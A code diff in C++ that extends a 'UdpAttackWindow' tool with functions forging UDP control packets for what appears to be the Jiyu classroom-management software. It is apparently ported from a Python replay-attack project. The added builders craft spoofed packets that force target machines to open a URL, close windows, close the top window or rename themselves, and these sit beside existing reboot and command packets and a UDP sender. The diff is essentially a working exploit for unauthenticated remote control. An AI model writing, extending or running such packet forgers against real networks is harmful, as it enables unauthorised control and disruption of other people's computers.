@@ -132,6 +132,120 @@ std::vector<unsigned char> UdpAttackWindow::BuildCmdPacket(const std::wstring& c
 	return packet;
 }
 
+std::vector<unsigned char> UdpAttackWindow::FormatUtf16(const std::wstring& str, int maxBytes)
+{
+	std::vector<unsigned char> result(maxBytes, 0);
+	int byteLen = (int)str.length() * 2;
+	if (byteLen > maxBytes) byteLen = maxBytes;
+	for (int i = 0; i < (int)str.length() && i * 2 < maxBytes; i++)
+	{
+		result[i * 2] = (unsigned char)(str[i] & 0xFF);
+		result[i * 2 + 1] = (unsigned char)((str[i] >> 8) & 0xFF);
+	}
+	return result;
+}
+
+std::vector<unsigned char> UdpAttackWindow::BuildWebsitePacket(const std::wstring& url)
+{
+	// 参考 Jiyu_replay_attack packet.py pkg_website
+	std::vector<unsigned char> urlData;
+	for (wchar_t ch : url)
+	{
+		urlData.push_back((unsigned char)(ch & 0xFF));
+		urlData.push_back((unsigned char)((ch >> 8) & 0xFF));
+	}
+	int dataLen = (int)urlData.size();
+	int totalLen = 8 + 4 + 16 + 8 + 4 + 4 + 16 + dataLen + 4;
+	std::vector<unsigned char> packet(totalLen, 0);
+	int pos = 0;
+	// magic + version
+	packet[pos++] = 0x44; packet[pos++] = 0x4d; packet[pos++] = 0x4f; packet[pos++] = 0x43;
+	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x01; packet[pos++] = 0x00;
+	// size+36 little endian
+	int sz = dataLen + 36;
+	packet[pos++] = sz & 0xFF; packet[pos++] = (sz >> 8) & 0xFF;
+	packet[pos++] = (sz >> 16) & 0xFF; packet[pos++] = (sz >> 24) & 0xFF;
+	// 16 random bytes (use fixed for simplicity)
+	for (int i = 0; i < 16; i++) packet[pos++] = (unsigned char)(rand() & 0xFF);
+	// fixed 8 bytes
+	packet[pos++] = 0x20; packet[pos++] = 0x4e; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	packet[pos++] = 0xc0; packet[pos++] = 0xa8; packet[pos++] = 0xe9; packet[pos++] = 0x01;
+	// size+23 * 2
+	sz = dataLen + 23;
+	packet[pos++] = sz & 0xFF; packet[pos++] = (sz >> 8) & 0xFF;
+	packet[pos++] = (sz >> 16) & 0xFF; packet[pos++] = (sz >> 24) & 0xFF;
+	packet[pos++] = sz & 0xFF; packet[pos++] = (sz >> 8) & 0xFF;
+	packet[pos++] = (sz >> 16) & 0xFF; packet[pos++] = (sz >> 24) & 0xFF;
+	// fixed 16 bytes
+	packet[pos++] = 0x00; packet[pos++] = 0x02; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	packet[pos++] = 0x18; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	// url data
+	memcpy(packet.data() + pos, urlData.data(), dataLen);
+	pos += dataLen;
+	// 4 bytes zero
+	return packet;
+}
+
+std::vector<unsigned char> UdpAttackWindow::BuildCloseWindowsPacket()
+{
+	// 参考 packet.py pkg_close_windows，582字节，与reboot类似但cmd=0x0200
+	std::vector<unsigned char> packet(REBOOT_TEMPLATE, REBOOT_TEMPLATE + sizeof(REBOOT_TEMPLATE));
+	// 修改 cmd 字段：reboot是0x1300，close_windows是0x0200
+	// 偏移44-45是cmd字段
+	packet[44] = 0x02;
+	packet[45] = 0x00;
+	return packet;
+}
+
+std::vector<unsigned char> UdpAttackWindow::BuildCloseTopWindowPacket()
+{
+	// 参考 packet.py pkg_close_top_window，906字节
+	std::vector<unsigned char> packet(906, 0);
+	int pos = 0;
+	// head: DMOC + version + cmd(0x6e03) + 16 random + 28 fixed
+	packet[pos++] = 0x44; packet[pos++] = 0x4d; packet[pos++] = 0x4f; packet[pos++] = 0x43;
+	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x01; packet[pos++] = 0x00;
+	packet[pos++] = 0x6e; packet[pos++] = 0x03; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	for (int i = 0; i < 16; i++) packet[pos++] = (unsigned char)(rand() & 0xFF);
+	// 28 bytes fixed
+	packet[pos++] = 0x20; packet[pos++] = 0x4e; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	packet[pos++] = 0xc0; packet[pos++] = 0xa8; packet[pos++] = 0x01; packet[pos++] = 0x9b;
+	packet[pos++] = 0x61; packet[pos++] = 0x03; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	packet[pos++] = 0x61; packet[pos++] = 0x03; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	packet[pos++] = 0x00; packet[pos++] = 0x02; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	packet[pos++] = 0x0e; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	// rest 850 bytes zero
+	return packet;
+}
+
+std::vector<unsigned char> UdpAttackWindow::BuildRenamePacket(const std::wstring& name, int nameId)
+{
+	// 参考 packet.py pkg_rename，96字节，GCMN魔数
+	std::vector<unsigned char> packet(96, 0);
+	int pos = 0;
+	// head: GCMN + version + size(0x44) + 16 bytes GUID + 4 bytes name_id
+	packet[pos++] = 0x47; packet[pos++] = 0x43; packet[pos++] = 0x4d; packet[pos++] = 0x4e;
+	packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x01; packet[pos++] = 0x00;
+	packet[pos++] = 0x44; packet[pos++] = 0x00; packet[pos++] = 0x00; packet[pos++] = 0x00;
+	// 16 bytes fixed GUID (from packet.py)
+	unsigned char guid[16] = {0x66,0xb1,0xe4,0x92,0x3f,0x9a,0x36,0x4a,0x94,0x3a,0x3d,0xa3,0xbd,0x97,0x60,0x41};
+	memcpy(packet.data() + pos, guid, 16);
+	pos += 16;
+	// name_id little endian
+	packet[pos++] = nameId & 0xFF;
+	packet[pos++] = (nameId >> 8) & 0xFF;
+	packet[pos++] = (nameId >> 16) & 0xFF;
+	packet[pos++] = (nameId >> 24) & 0xFF;
+	// name (utf-16le, null terminated, max 64 bytes)
+	std::wstring fullName = name + L"\x00";
+	auto nameData = FormatUtf16(fullName, 64);
+	memcpy(packet.data() + pos, nameData.data(), 64);
+	return packet;
+}
+
 bool UdpAttackWindow::SendUdp(const std::wstring& ip, int port, const std::vector<unsigned char>& data)
 {
 	SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
